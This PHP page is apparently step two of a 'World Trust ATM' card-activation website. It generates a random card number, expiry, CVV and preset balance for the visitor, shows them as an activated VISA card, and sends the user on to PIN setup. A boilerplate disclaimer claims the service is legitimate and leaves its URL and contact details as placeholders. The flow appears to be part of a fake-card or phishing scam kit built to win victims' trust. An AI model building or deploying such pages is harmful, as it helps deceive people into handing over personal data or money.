<?php
/**
 * World Trust ATM - Card Activation
 * Page 2: Loading & Card Display
 */

require_once 'includes/config.php';
require_once 'includes/functions.php';

// Check if user data exists in session
check_user_session();
check_session_timeout();

// Generate card data if not exists
if (!isset($_SESSION['card_data'])) {
    $_SESSION['card_data'] = [
        'card_number' => generate_card_number(),
        'expiry_date' => generate_expiration_date(),
        'cvv' => generate_cvv(),
        'balance' => DEFAULT_BALANCE
    ];
}

$card_data = $_SESSION['card_data'];
$user_name = get_full_name();
$card_number_masked = format_card_number_masked($card_data['card_number']);
$balance = format_currency($card_data['balance']);
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?php echo APP_NAME; ?> - Card Activated</title>
    <link rel="stylesheet" href="css/styles.css">
</head>
<body>
    <div class="container">
        <!-- Header -->
        <header class="header">
            <h1 class="logo"><?php echo APP_NAME; ?></h1>
            <p class="tagline"><?php echo APP_TAGLINE; ?></p>
        </header>

        <!-- Loading Container (will be hidden after loading) -->
        <div class="loading-container" id="loadingContainer">
            <div class="loading-spinner"></div>
            <p class="loading-text">Activating your card...</p>
            <div class="progress-bar-container">
                <div class="progress-bar" id="progressBar"></div>
            </div>
            <p class="progress-text"><span id="progressPercent">0</span>% Complete</p>
        </div>

        <!-- Card Display Container (will be shown after loading) -->
        <div class="card-display-container" id="cardContainer" style="display: none;">
            <div class="success-icon">✓</div>
            <h2 class="success-message">Your card is ready for activation!</h2>
            
            <!-- ATM Card -->
            <div class="atm-card">
                <div class="card-logo">VISA</div>
                <div class="card-chip"></div>
                <div class="card-number"><?php echo $card_number_masked; ?></div>
                <div class="card-details">
                    <div class="card-holder">
                        <div class="card-label">Card Holder</div>
                        <div class="card-value"><?php echo strtoupper($user_name); ?></div>
                    </div>
                    <div class="card-expiry">
                        <div class="card-label">Expires</div>
                        <div class="card-value"><?php echo $card_data['expiry_date']; ?></div>
                    </div>
                </div>
            </div>
            
            <!-- Balance Display -->
            <div class="balance-display">
                <div class="balance-label">Available Balance</div>
                <div class="balance-amount"><?php echo $balance; ?></div>
            </div>
            
            <p style="margin-bottom: 20px; color: var(--text-light);">
                Your card details have been generated and are ready for activation. Please continue to set up your secure PIN.
            </p>
            
            <a href="pin-setup.php" style="text-decoration: none;">
                <button class="btn btn-primary">Continue to PIN Setup</button>
            </a>
        </div>
        
        <!-- Disclaimer -->
        <div class="disclaimer">
            <div class="disclaimer-title">Security Disclaimer</div>
            <p>This is a legitimate card activation service. We will never ask for your PIN, full card number via email/text, or request payment to activate your card. Always verify you're on the correct website URL (https://[yoursite.com]) before entering any information.  If you receive suspicious emails or calls claiming to be from us, do not provide any personal information and contact our security team immediately at [security phone/email]. Your data is protected with bank-level encryption and will never be sold to third parties. </p>
        </div>
    </div>
    
    <script src="js/card-display.js"></script>
</body>
</html>
